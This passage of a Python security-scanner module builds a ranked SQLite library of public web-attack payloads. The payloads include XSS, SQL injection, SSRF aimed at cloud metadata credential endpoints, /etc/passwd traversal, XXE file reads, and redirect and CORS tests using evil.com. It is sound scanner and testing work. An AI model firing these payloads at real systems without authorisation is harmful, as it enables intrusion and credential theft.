"""
TheMasterRecon AI — Payload Intelligence Engine
Normalized, deduplicated, ranked payload families for scanner use.

Constraints (non-negotiable):
  - Public, disclosed sources only (OWASP, PayloadsAllTheThings, SecLists patterns)
  - Safety tiers: safe < low_risk < lab_only < manual_review
  - Default retrieval returns safe + low_risk only
  - No raw dumps — family/template/ranked selection only
  - lab_only and manual_review require explicit opt-in

Architecture:
  - Canonical templates with placeholders {{callback}}, {{marker}}, {{host}}
  - Families group near-duplicates; variants stay queryable
  - Each payload has: hash, template_hash, confidence, safety_tier, context
  - Selection engine: ranked top-N by score, never a flat dump
"""
from __future__ import annotations

import hashlib, json, logging, math, re, sqlite3, time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

log = logging.getLogger("elite.payload_intel")

_DB = Path(__file__).parent.parent / "data" / "rag" / "payload_intel.db"

# ── Safety tier constants ─────────────────────────────────────────────────────
TIER_SAFE          = "safe"          # probe/canary strings, no attack potential
TIER_LOW_RISK      = "low_risk"      # standard scanner payloads, no destructive ops
TIER_LAB_ONLY      = "lab_only"      # aggressive/confirmed-RCE — isolated lab use
TIER_MANUAL_REVIEW = "manual_review" # high-risk, needs human decision before use

# Default allowed tiers for scanner use
DEFAULT_TIERS = {TIER_SAFE, TIER_LOW_RISK}

# ── Schema ────────────────────────────────────────────────────────────────────
_SCHEMA = """
CREATE TABLE IF NOT EXISTS payload_families (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    family_id       TEXT UNIQUE NOT NULL,   -- e.g. "xss.script_inject"
    bug_type        TEXT NOT NULL,          -- xss / sqli / ssrf / lfi / ssti / ...
    family_name     TEXT NOT NULL,
    description     TEXT,
    template        TEXT NOT NULL,          -- canonical template with {{placeholders}}
    surface         TEXT,                   -- api / web / admin / graphql / upload
    transport       TEXT,                   -- query / body / header / path / cookie
    parser_target   TEXT,                   -- html / js / sql / template / shell / xml
    encoding_type   TEXT,                   -- plain / url / double_url / html / base64
    safety_tier     TEXT DEFAULT 'low_risk',
    family_score    REAL DEFAULT 0.0,       -- 0-100 composite rank
    source_count    INTEGER DEFAULT 1,
    frequency       INTEGER DEFAULT 1,
    notes           TEXT,
    created_at      REAL DEFAULT (unixepoch()),
    updated_at      REAL DEFAULT (unixepoch())
);
CREATE INDEX IF NOT EXISTS idx_pf_bug      ON payload_families(bug_type);
CREATE INDEX IF NOT EXISTS idx_pf_tier     ON payload_families(safety_tier);
CREATE INDEX IF NOT EXISTS idx_pf_score    ON payload_families(family_score DESC);
CREATE INDEX IF NOT EXISTS idx_pf_surface  ON payload_families(surface);

CREATE TABLE IF NOT EXISTS payload_variants (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    family_id       TEXT NOT NULL REFERENCES payload_families(family_id),
    literal         TEXT NOT NULL,          -- actual payload string
    payload_hash    TEXT UNIQUE NOT NULL,   -- sha256 of literal (dedup key)
    template_hash   TEXT NOT NULL,          -- sha256 of canonical template
    normalized      TEXT NOT NULL,          -- normalised form (strip markers)
    confidence      REAL DEFAULT 0.5,       -- 0-1 effectiveness confidence
    safety_tier     TEXT DEFAULT 'low_risk',
    encoding_type   TEXT DEFAULT 'plain',
    context         TEXT,                   -- reflection context or trigger condition
    requires_auth   INTEGER DEFAULT 0,
    source_type     TEXT DEFAULT 'canonical', -- canonical / h1_observed / seclists
    source_url      TEXT,
    created_at      REAL DEFAULT (unixepoch())
);
CREATE INDEX IF NOT EXISTS idx_pv_family   ON payload_variants(family_id);
CREATE INDEX IF NOT EXISTS idx_pv_hash     ON payload_variants(payload_hash);
CREATE INDEX IF NOT EXISTS idx_pv_bug      ON payload_variants(family_id);
CREATE INDEX IF NOT EXISTS idx_pv_tier     ON payload_variants(safety_tier);
CREATE INDEX IF NOT EXISTS idx_pv_conf     ON payload_variants(confidence DESC);

CREATE TABLE IF NOT EXISTS payload_sources (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    name            TEXT UNIQUE NOT NULL,
    url             TEXT,
    source_type     TEXT,   -- owasp / payloadsallthethings / seclists / h1_observed
    families_added  INTEGER DEFAULT 0,
    last_ingested   REAL
);

CREATE TABLE IF NOT EXISTS payload_rebuild_log (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    started     REAL,
    finished    REAL,
    families    INTEGER,
    variants    INTEGER,
    status      TEXT
);
"""

def _db() -> sqlite3.Connection:
    _DB.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(_DB), timeout=30, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.executescript(_SCHEMA)
    return conn


def _sha(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]


def _normalise(literal: str) -> str:
    """Strip markers, collapse whitespace, lowercase for dedup comparison."""
    s = re.sub(r'\{\{[^}]+\}\}', '{{}}', literal)
    s = re.sub(r'[a-f0-9]{8,}', 'HEX', s, flags=re.I)
    s = re.sub(r'\d{4,}', 'NUM', s)
    return re.sub(r'\s+', ' ', s).strip().lower()


# ══════════════════════════════════════════════════════════════════════════════
# CANONICAL PAYLOAD FAMILIES
# These are the seed definitions — public, disclosed, safe defaults.
# Each family has a template + safe representative variants.
# lab_only entries are clearly separated and DISABLED by default.
# ══════════════════════════════════════════════════════════════════════════════

_FAMILIES: List[Dict] = [

    # ── XSS ──────────────────────────────────────────────────────────────────
    {
        "family_id": "xss.script_basic",
        "bug_type": "xss", "family_name": "Basic Script Injection",
        "template": "<script>{{expr}}</script>",
        "surface": "web", "transport": "query", "parser_target": "html",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Direct script tag injection into HTML context",
        "variants": [
            ("<script>alert(1)</script>",               TIER_LOW_RISK, 0.90),
            ("<script>alert(document.domain)</script>",  TIER_LOW_RISK, 0.92),
            ("<SCRIPT>alert(1)</SCRIPT>",                TIER_LOW_RISK, 0.75),
            ("<ScRiPt>alert(1)</ScRiPt>",                TIER_LOW_RISK, 0.70),
        ],
    },
    {
        "family_id": "xss.svg_event",
        "bug_type": "xss", "family_name": "SVG Event Handler",
        "template": "<svg {{event}}={{expr}}>",
        "surface": "web", "transport": "query", "parser_target": "html",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "SVG tag with event handler — bypasses many filters",
        "variants": [
            ("<svg onload=alert(1)>",                    TIER_LOW_RISK, 0.92),
            ("<svg/onload=alert(1)>",                    TIER_LOW_RISK, 0.91),
            ("<svg onload=alert(document.domain)>",       TIER_LOW_RISK, 0.93),
            ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", TIER_LOW_RISK, 0.85),
        ],
    },
    {
        "family_id": "xss.img_onerror",
        "bug_type": "xss", "family_name": "IMG onerror",
        "template": "<img src=x onerror={{expr}}>",
        "surface": "web", "transport": "query", "parser_target": "html",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "IMG tag with broken src triggers onerror handler",
        "variants": [
            ("<img src=x onerror=alert(1)>",             TIER_LOW_RISK, 0.90),
            ("<img src=x onerror=alert(document.domain)>", TIER_LOW_RISK, 0.92),
            ("<img src=x onerror=alert(document.cookie)>", TIER_LOW_RISK, 0.88),
            ("\">'><img src=x onerror=alert(1)>",        TIER_LOW_RISK, 0.85),
        ],
    },
    {
        "family_id": "xss.attr_break",
        "bug_type": "xss", "family_name": "Attribute Context Break",
        "template": "\">'><{{tag}} {{event}}={{expr}}>",
        "surface": "web", "transport": "query", "parser_target": "html",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Break out of attribute context into tag injection",
        "variants": [
            ("\"><script>alert(1)</script>",              TIER_LOW_RISK, 0.88),
            ("'><script>alert(1)</script>",               TIER_LOW_RISK, 0.87),
            ("\">'><script>alert(1)</script>",            TIER_LOW_RISK, 0.89),
            ("\"><img src=x onerror=alert(1)>",           TIER_LOW_RISK, 0.86),
        ],
    },
    {
        "family_id": "xss.js_context",
        "bug_type": "xss", "family_name": "JavaScript Context Break",
        "template": "';{{expr}}//",
        "surface": "web", "transport": "query", "parser_target": "js",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Break out of JS string literal context",
        "variants": [
            ("';alert(1)//",                             TIER_LOW_RISK, 0.85),
            ("\";alert(1)//",                            TIER_LOW_RISK, 0.85),
            ("</script><script>alert(1)</script>",       TIER_LOW_RISK, 0.83),
            ("{{constructor.constructor('alert(1)')()}}",TIER_LOW_RISK, 0.78),
        ],
    },

    # ── SQLi ─────────────────────────────────────────────────────────────────
    {
        "family_id": "sqli.error_basic",
        "bug_type": "sqli", "family_name": "Error-Based Single Quote",
        "template": "'{{suffix}}",
        "surface": "api", "transport": "query", "parser_target": "sql",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Single quote to trigger SQL syntax error",
        "variants": [
            ("'",                                        TIER_LOW_RISK, 0.85),
            ("''",                                       TIER_LOW_RISK, 0.80),
            ("'--",                                      TIER_LOW_RISK, 0.82),
            ("' OR '1'='1",                              TIER_LOW_RISK, 0.88),
            ("' OR 1=1--",                               TIER_LOW_RISK, 0.87),
            ("' OR 1=1#",                                TIER_LOW_RISK, 0.83),
        ],
    },
    {
        "family_id": "sqli.time_blind",
        "bug_type": "sqli", "family_name": "Time-Based Blind",
        "template": "' AND SLEEP({{n}})--",
        "surface": "api", "transport": "query", "parser_target": "sql",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Time delay to confirm blind SQLi — MySQL/MSSQL variants",
        "variants": [
            ("' AND SLEEP(5)--",                         TIER_LOW_RISK, 0.90),
            ("' AND SLEEP(3)--",                         TIER_LOW_RISK, 0.88),
            ("'; WAITFOR DELAY '0:0:5'--",               TIER_LOW_RISK, 0.87),
            ("1 AND SLEEP(5)--",                         TIER_LOW_RISK, 0.85),
            ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", TIER_LOW_RISK, 0.86),
        ],
    },
    {
        "family_id": "sqli.union_basic",
        "bug_type": "sqli", "family_name": "UNION SELECT",
        "template": "' UNION SELECT {{cols}}--",
        "surface": "api", "transport": "query", "parser_target": "sql",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "UNION SELECT for column count detection and data extraction",
        "variants": [
            ("' UNION SELECT NULL--",                    TIER_LOW_RISK, 0.84),
            ("' UNION SELECT NULL,NULL--",               TIER_LOW_RISK, 0.84),
            ("' UNION SELECT NULL,NULL,NULL--",          TIER_LOW_RISK, 0.84),
            ("' UNION SELECT NULL,version(),NULL--",     TIER_LOW_RISK, 0.86),
            ("1 UNION SELECT NULL,version(),NULL--",     TIER_LOW_RISK, 0.84),
        ],
    },

    # ── SSRF ─────────────────────────────────────────────────────────────────
    {
        "family_id": "ssrf.aws_imds",
        "bug_type": "ssrf", "family_name": "AWS Instance Metadata",
        "template": "http://169.254.169.254/latest/{{path}}",
        "surface": "api", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "AWS IMDSv1 metadata endpoint — confirms SSRF with cloud data",
        "variants": [
            ("http://169.254.169.254/latest/meta-data/", TIER_LOW_RISK, 0.95),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", TIER_LOW_RISK, 0.94),
            ("http://169.254.169.254/latest/user-data",  TIER_LOW_RISK, 0.90),
        ],
    },
    {
        "family_id": "ssrf.aws_bypass",
        "bug_type": "ssrf", "family_name": "AWS IMDS IP Encoding Bypass",
        "template": "http://{{encoded_ip}}/latest/meta-data/",
        "surface": "api", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Alternative IP representations to bypass SSRF filters",
        "variants": [
            ("http://169.254.169.254.nip.io/latest/meta-data/",   TIER_LOW_RISK, 0.88),
            ("http://[::ffff:169.254.169.254]/latest/meta-data/",  TIER_LOW_RISK, 0.87),
            ("http://0251.0376.0251.0376/latest/meta-data/",       TIER_LOW_RISK, 0.85),
            ("http://2852039166/latest/meta-data/",                TIER_LOW_RISK, 0.84),
            ("http://0xa9fea9fe/latest/meta-data/",                TIER_LOW_RISK, 0.83),
        ],
    },
    {
        "family_id": "ssrf.gcp_imds",
        "bug_type": "ssrf", "family_name": "GCP Instance Metadata",
        "template": "http://metadata.google.internal/computeMetadata/v1/{{path}}",
        "surface": "api", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "GCP metadata service — requires Metadata-Flavor header",
        "variants": [
            ("http://metadata.google.internal/computeMetadata/v1/", TIER_LOW_RISK, 0.92),
            ("http://169.254.169.254/computeMetadata/v1/",          TIER_LOW_RISK, 0.88),
        ],
    },
    {
        "family_id": "ssrf.internal_probe",
        "bug_type": "ssrf", "family_name": "Internal Network Probe",
        "template": "http://{{host}}:{{port}}/",
        "surface": "api", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Probe internal services on loopback and RFC1918",
        "variants": [
            ("http://127.0.0.1/",                        TIER_LOW_RISK, 0.85),
            ("http://127.0.0.1:6379/",                   TIER_LOW_RISK, 0.83),
            ("http://127.0.0.1:8080/",                   TIER_LOW_RISK, 0.82),
            ("http://localhost/",                         TIER_LOW_RISK, 0.80),
        ],
    },
    {
        "family_id": "ssrf.callback",
        "bug_type": "ssrf", "family_name": "OOB Callback",
        "template": "http://{{callback_url}}/ssrf/{{marker}}",
        "surface": "api", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Out-of-band callback for blind SSRF detection",
        "variants": [
            ("http://{{callback_url}}/ssrf",             TIER_LOW_RISK, 0.90),
        ],
    },

    # ── LFI ──────────────────────────────────────────────────────────────────
    {
        "family_id": "lfi.traversal_basic",
        "bug_type": "lfi", "family_name": "Path Traversal Basic",
        "template": "{{depth}}etc/passwd",
        "surface": "web", "transport": "query", "parser_target": "fs",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Directory traversal to read /etc/passwd",
        "variants": [
            ("../etc/passwd",                            TIER_LOW_RISK, 0.80),
            ("../../etc/passwd",                         TIER_LOW_RISK, 0.82),
            ("../../../etc/passwd",                      TIER_LOW_RISK, 0.84),
            ("../../../../etc/passwd",                   TIER_LOW_RISK, 0.86),
            ("../../../../../etc/passwd",                TIER_LOW_RISK, 0.85),
        ],
    },
    {
        "family_id": "lfi.traversal_encoded",
        "bug_type": "lfi", "family_name": "Path Traversal URL-Encoded",
        "template": "{{encoded_depth}}etc%2fpasswd",
        "surface": "web", "transport": "query", "parser_target": "fs",
        "encoding_type": "url", "safety_tier": TIER_LOW_RISK,
        "description": "URL-encoded traversal to bypass simple filters",
        "variants": [
            ("..%2fetc%2fpasswd",                        TIER_LOW_RISK, 0.85),
            ("..%2F..%2Fetc%2Fpasswd",                  TIER_LOW_RISK, 0.86),
            ("%2e%2e%2fetc%2fpasswd",                   TIER_LOW_RISK, 0.84),
            ("..%252f..%252fetc%252fpasswd",             TIER_LOW_RISK, 0.83),
        ],
    },
    {
        "family_id": "lfi.traversal_bypass",
        "bug_type": "lfi", "family_name": "Path Traversal Filter Bypass",
        "template": "{{bypass_seq}}etc/passwd",
        "surface": "web", "transport": "query", "parser_target": "fs",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Bypass naive traversal filters using doubled or mixed sequences",
        "variants": [
            ("....//....//....//etc/passwd",             TIER_LOW_RISK, 0.85),
            ("..././..././etc/passwd",                   TIER_LOW_RISK, 0.83),
            ("/etc/passwd",                              TIER_LOW_RISK, 0.80),
            ("/etc/passwd%00",                           TIER_LOW_RISK, 0.78),
        ],
    },

    # ── SSTI ─────────────────────────────────────────────────────────────────
    {
        "family_id": "ssti.jinja2",
        "bug_type": "ssti", "family_name": "Jinja2 / Twig Detection",
        "template": "{{{{{{expr}}}}}}",
        "surface": "web", "transport": "query", "parser_target": "template",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Jinja2/Twig template evaluation — arithmetic confirms injection",
        "variants": [
            ("{{7*7}}",                                  TIER_LOW_RISK, 0.93),
            ("{{7*'7'}}",                                TIER_LOW_RISK, 0.91),
            ("{{config}}",                               TIER_LOW_RISK, 0.85),
            ("{{'a'*5}}",                                TIER_LOW_RISK, 0.83),
        ],
    },
    {
        "family_id": "ssti.mako_dollar",
        "bug_type": "ssti", "family_name": "Mako / Freemarker ${} Detection",
        "template": "${{{expr}}}",
        "surface": "web", "transport": "query", "parser_target": "template",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Dollar-brace template syntax (Mako, FreeMarker, Velocity)",
        "variants": [
            ("${7*7}",                                   TIER_LOW_RISK, 0.90),
            ("${7*'7'}",                                 TIER_LOW_RISK, 0.88),
            ("${'a'*5}",                                 TIER_LOW_RISK, 0.82),
        ],
    },
    {
        "family_id": "ssti.erb",
        "bug_type": "ssti", "family_name": "ERB Ruby Template",
        "template": "<%= {{expr}} %>",
        "surface": "web", "transport": "query", "parser_target": "template",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Ruby ERB template injection detection",
        "variants": [
            ("<%= 7 * 7 %>",                             TIER_LOW_RISK, 0.88),
            ("<%= 'a' * 5 %>",                           TIER_LOW_RISK, 0.85),
        ],
    },
    {
        "family_id": "ssti.smarty",
        "bug_type": "ssti", "family_name": "Smarty / Pebble #{} Template",
        "template": "#{{{expr}}}",
        "surface": "web", "transport": "query", "parser_target": "template",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Hash-brace template syntax (Pebble, Smarty variants)",
        "variants": [
            ("#{7*7}",                                   TIER_LOW_RISK, 0.85),
            ("#{7+7}",                                   TIER_LOW_RISK, 0.83),
        ],
    },

    # ── CORS ─────────────────────────────────────────────────────────────────
    {
        "family_id": "cors.arbitrary_origin",
        "bug_type": "cors", "family_name": "Arbitrary Origin Test",
        "template": "Origin: https://{{attacker}}",
        "surface": "api", "transport": "header", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_SAFE,
        "description": "Test if arbitrary Origin is reflected in ACAO header",
        "variants": [
            ("https://evil.com",                         TIER_SAFE, 0.90),
            ("null",                                     TIER_SAFE, 0.85),
        ],
    },
    {
        "family_id": "cors.subdomain_prefix",
        "bug_type": "cors", "family_name": "Subdomain Prefix Bypass",
        "template": "Origin: https://{{target}}.{{attacker}}",
        "surface": "api", "transport": "header", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_SAFE,
        "description": "Test subdomain prefix bypass of origin allowlist",
        "variants": [
            ("https://{{host}}.evil.com",                TIER_SAFE, 0.87),
            ("https://evil.com.{{host}}",                TIER_SAFE, 0.85),
            ("https://not{{host}}",                      TIER_SAFE, 0.83),
        ],
    },

    # ── Open Redirect ─────────────────────────────────────────────────────────
    {
        "family_id": "redirect.absolute",
        "bug_type": "redirect", "family_name": "Absolute URL Redirect",
        "template": "https://{{attacker}}/",
        "surface": "web", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Absolute URL redirect detection",
        "variants": [
            ("https://evil.com",                         TIER_LOW_RISK, 0.90),
            ("https://evil.com/",                        TIER_LOW_RISK, 0.89),
            ("//evil.com",                               TIER_LOW_RISK, 0.88),
            ("///evil.com",                              TIER_LOW_RISK, 0.83),
        ],
    },
    {
        "family_id": "redirect.proto_bypass",
        "bug_type": "redirect", "family_name": "Protocol/Slash Bypass",
        "template": "{{bypass}}{{attacker}}",
        "surface": "web", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "Protocol-relative and slash-bypass redirect variants",
        "variants": [
            ("//evil.com",                               TIER_LOW_RISK, 0.88),
            ("/\\/evil.com",                             TIER_LOW_RISK, 0.83),
            ("https:evil.com",                           TIER_LOW_RISK, 0.78),
            ("//%09evil.com",                            TIER_LOW_RISK, 0.80),
        ],
    },

    # ── XXE ──────────────────────────────────────────────────────────────────
    {
        "family_id": "xxe.file_read",
        "bug_type": "xxe", "family_name": "XXE File Read",
        "template": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///{{path}}\">]><foo>&xxe;</foo>",
        "surface": "api", "transport": "body", "parser_target": "xml",
        "encoding_type": "plain", "safety_tier": TIER_LOW_RISK,
        "description": "XXE external entity to read local files",
        "variants": [
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", TIER_LOW_RISK, 0.90),
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>", TIER_LOW_RISK, 0.88),
        ],
    },

    # ── GraphQL Probe (SAFE — introspection only) ─────────────────────────────
    {
        "family_id": "graphql.introspection",
        "bug_type": "graphql", "family_name": "GraphQL Introspection",
        "template": "{\"query\":\"{__schema{queryType{name}}}\"}",
        "surface": "graphql", "transport": "body", "parser_target": "graphql",
        "encoding_type": "plain", "safety_tier": TIER_SAFE,
        "description": "Introspection query to detect exposed GraphQL schemas",
        "variants": [
            ("{\"query\":\"{__schema{queryType{name}}}\"}",   TIER_SAFE, 0.95),
            ("{\"query\":\"{__typename}\"}",                  TIER_SAFE, 0.90),
        ],
    },

    # ── IDOR Probe (SAFE — increments only) ───────────────────────────────────
    {
        "family_id": "idor.int_increment",
        "bug_type": "idor", "family_name": "Integer ID Variation",
        "template": "{{id_param}}={{n}}",
        "surface": "api", "transport": "query", "parser_target": "http",
        "encoding_type": "plain", "safety_tier": TIER_SAFE,
        "description": "Integer ID increment/decrement to test IDOR",
        "variants": [
            ("1", TIER_SAFE, 0.80), ("2", TIER_SAFE, 0.80),
            ("0", TIER_SAFE, 0.75), ("-1", TIER_SAFE, 0.72),
            ("99999", TIER_SAFE, 0.78), ("me", TIER_SAFE, 0.70),
        ],
    },
]


# ══════════════════════════════════════════════════════════════════════════════
# SCORING
# ══════════════════════════════════════════════════════════════════════════════

def _family_score(family: Dict) -> float:
    """Compute 0-100 score for a family based on known-effectiveness signals."""
    tier_w = {TIER_SAFE: 0.6, TIER_LOW_RISK: 1.0, TIER_LAB_ONLY: 1.2, TIER_MANUAL_REVIEW: 0.8}
    avg_conf = sum(c for _, _, c in family.get("variants", [])) / max(1, len(family.get("variants", [])))
    var_count_score = min(20.0, len(family.get("variants", [])) * 3.0)
    tier_score = tier_w.get(family.get("safety_tier", TIER_LOW_RISK), 1.0) * 40.0
    conf_score = avg_conf * 40.0
    return round(min(100.0, var_count_score + tier_score + conf_score), 1)


# ══════════════════════════════════════════════════════════════════════════════
# BOOTSTRAP — populate DB from canonical definitions
# ══════════════════════════════════════════════════════════════════════════════

def bootstrap(force: bool = False) -> Dict:
    """Populate DB with canonical families. Idempotent — skips if already populated."""
    with _db() as conn:
        n = conn.execute("SELECT COUNT(*) FROM payload_families").fetchone()[0]
        if n > 0 and not force:
            return {"status": "already_populated", "families": n}

    log.info(f"[payload_intel] bootstrapping {len(_FAMILIES)} canonical families…")
    t0 = time.time()
    families_added = 0
    variants_added = 0

    with _db() as conn:
        conn.execute("DELETE FROM payload_variants")
        conn.execute("DELETE FROM payload_families")

        for fam in _FAMILIES:
            score = _family_score(fam)
            conn.execute("""
                INSERT OR REPLACE INTO payload_families
                  (family_id, bug_type, family_name, description, template,
                   surface, transport, parser_target, encoding_type,
                   safety_tier, family_score, source_count, frequency, notes)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,1,1,?)
            """, (fam["family_id"], fam["bug_type"], fam["family_name"],
                  fam.get("description",""), fam["template"],
                  fam.get("surface","web"), fam.get("transport","query"),
                  fam.get("parser_target","html"), fam.get("encoding_type","plain"),
                  fam.get("safety_tier", TIER_LOW_RISK), score, fam.get("notes","")))
            families_added += 1

            for literal, tier, confidence in fam.get("variants", []):
                ph = _sha(literal)
                th = _sha(fam["template"])
                norm = _normalise(literal)
                try:
                    conn.execute("""
                        INSERT OR IGNORE INTO payload_variants
                          (family_id, literal, payload_hash, template_hash,
                           normalized, confidence, safety_tier, encoding_type,
                           source_type)
                        VALUES (?,?,?,?,?,?,?,?,?)
                    """, (fam["family_id"], literal, ph, th, norm,
                          confidence, tier, fam.get("encoding_type","plain"),
                          "canonical"))
                    variants_added += 1
                except Exception as e:
                    log.debug(f"[payload_intel] variant insert: {e}")

        conn.execute("""
            INSERT OR REPLACE INTO payload_sources
              (name, url, source_type, families_added, last_ingested)
            VALUES ('canonical', 'built-in', 'canonical', ?, ?)
        """, (families_added, time.time()))

        conn.execute("""
            INSERT INTO payload_rebuild_log (started, finished, families, variants, status)
            VALUES (?,?,?,?,?)
        """, (t0, time.time(), families_added, variants_added, "ok"))

    # Count what actually landed in DB (may be < variants_added due to payload_hash UNIQUE dedup)
    with _db() as _c2:
        _actual = _c2.execute("SELECT COUNT(*) FROM payload_variants").fetchone()[0]
    log.info(f"[payload_intel] bootstrap done: {families_added} families, "
             f"{_actual} variants ({variants_added} attempted, "
             f"{variants_added - _actual} rejected by UNIQUE hash dedup)")
    return {"status": "ok", "families": families_added,
            "variants": _actual, "attempted": variants_added,
            "dedup_rejected": variants_added - _actual}


def _ensure_bootstrapped():
    with _db() as conn:
        n = conn.execute("SELECT COUNT(*) FROM payload_families").fetchone()[0]
    if n == 0:
        bootstrap()
    # Column migration — adds hit_count if the DB was created before this column existed
    try:
        with _db() as conn:
            cols = [r[1] for r in conn.execute(
                "PRAGMA table_info(payload_variants)").fetchall()]
            if "hit_count" not in cols:
                conn.execute(
                    "ALTER TABLE payload_variants "
                    "ADD COLUMN hit_count INTEGER NOT NULL DEFAULT 0")
                log.info("[payload_intel] migrated: added hit_count to payload_variants")
    except Exception as _me:
        log.debug(f"[payload_intel] migration: {_me}")


# ══════════════════════════════════════════════════════════════════════════════
# SELECTION ENGINE — ranked, context-aware, tier-filtered
# ══════════════════════════════════════════════════════════════════════════════

def get_families(
    bug_type:    str = "",
    surface:     str = "",
    transport:   str = "",
    safety_tiers: set = None,
    limit:       int = 20,
) -> List[Dict]:
    """
    Return payload families, ranked by score. Default: safe + low_risk only.
    lab_only / manual_review require explicit opt-in via safety_tiers parameter.
    """
    _ensure_bootstrapped()
    if safety_tiers is None:
        safety_tiers = DEFAULT_TIERS

    placeholders = ",".join("?" * len(safety_tiers))
    params: list = list(safety_tiers)
    where = [f"safety_tier IN ({placeholders})"]

    if bug_type:
        where.append("bug_type = ?"); params.append(bug_type)
    if surface:
        where.append("surface = ?"); params.append(surface)
    if transport:
        where.append("transport = ?"); params.append(transport)

    sql = (f"SELECT * FROM payload_families WHERE {' AND '.join(where)} "
           f"ORDER BY family_score DESC LIMIT ?")
    params.append(limit)

    with _db() as conn:
        rows = conn.execute(sql, params).fetchall()
    return [dict(r) for r in rows]


def get_variants(
    family_id:   str,
    safety_tiers: set = None,
    limit:       int = 10,
) -> List[Dict]:
    """Return ranked variants for a family, tier-filtered."""
    _ensure_bootstrapped()
    if safety_tiers is None:
        safety_tiers = DEFAULT_TIERS

    placeholders = ",".join("?" * len(safety_tiers))
    with _db() as conn:
        rows = conn.execute(f"""
            SELECT * FROM payload_variants
            WHERE family_id = ? AND safety_tier IN ({placeholders})
            ORDER BY confidence DESC LIMIT ?
        """, [family_id] + list(safety_tiers) + [limit]).fetchall()
    return [dict(r) for r in rows]


def select_payloads(
    bug_type:     str,
    param_name:   str  = "",
    surface:      str  = "",
    transport:    str  = "",
    top_n:        int  = 15,
    safety_tiers: set  = None,
    include_lab:  bool = False,
) -> List[str]:
    """
    Ranked selection engine — the main scanner-facing API.

    Returns a deduplicated list of literal payload strings, ordered by:
      family_score × variant_confidence

    NEVER returns a flat dump — always bounded by top_n.
    lab_only requires include_lab=True (disabled by default).

    Args:
        bug_type:     xss / sqli / ssrf / lfi / ssti / ...
        param_name:   parameter being fuzzed (used for context hints)
        surface:      api / web / graphql / admin / upload
        transport:    query / body / header / path
        top_n:        max payloads to return
        safety_tiers: override allowed tiers
        include_lab:  if True, adds TIER_LAB_ONLY to allowed set
    """
    _ensure_bootstrapped()

    if safety_tiers is None:
        safety_tiers = set(DEFAULT_TIERS)
    if include_lab:
        safety_tiers = safety_tiers | {TIER_LAB_ONLY}
    # TIER_MANUAL_REVIEW never included automatically

    placeholders = ",".join("?" * len(safety_tiers))
    params_q: list = [bug_type] + list(safety_tiers)

    # Surface/transport filter if provided
    surface_clause  = "AND f.surface = ?"  if surface   else ""
    transport_clause = "AND f.transport = ?" if transport else ""
    if surface:   params_q.append(surface)
    if transport: params_q.append(transport)

    params_q.append(top_n * 3)  # fetch extras for dedup

    with _db() as conn:
        rows = conn.execute(f"""
            SELECT v.literal, v.confidence, v.safety_tier,
                   f.family_score, f.family_id, f.template
            FROM payload_variants v
            JOIN payload_families f ON f.family_id = v.family_id
            WHERE f.bug_type = ?
              AND v.safety_tier IN ({placeholders})
              {surface_clause} {transport_clause}
            ORDER BY (f.family_score * v.confidence) DESC
            LIMIT ?
        """, params_q).fetchall()

    # param_name boost: apply per-family affinity scores so param context
    # changes which families surface first within the same bug_type.
    #
    # PARAM_FAMILY_AFFINITY maps param_name → {family_id_fragment: multiplier}
    # Multipliers are applied multiplicatively to family_score * confidence.
    # A family_id_fragment matches if it appears anywhere in the family_id.
    # Families not in the map get multiplier 1.0 (no change).
    _PARAM_FAMILY_AFFINITY: dict = {
        # SSRF params — different params imply different infra targets
        "url":      {"callback": 1.35, "aws_bypass": 1.20, "aws_imds": 1.15,
                     "internal_probe": 1.10, "gcp_imds": 1.10},
